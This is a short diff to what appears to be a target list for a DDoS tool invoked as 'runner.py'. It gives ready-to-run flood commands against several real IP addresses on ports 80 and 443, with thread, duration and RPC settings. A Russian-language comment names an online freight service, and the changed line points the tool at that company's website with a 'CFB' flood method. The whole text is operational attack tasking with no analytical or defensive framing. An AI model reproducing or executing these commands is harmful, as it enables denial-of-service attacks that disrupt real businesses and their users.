@@ -15,4 +15,4 @@
 #runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 -p 3600 --rpc 50 --http-methods TCP FLOOD
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
--p 3600 https://www.vezetvsem.ru/ --http-methods CFB --debug
+-runner.py https://www.vezetvsem.ru/ --http-methods CFB --debug
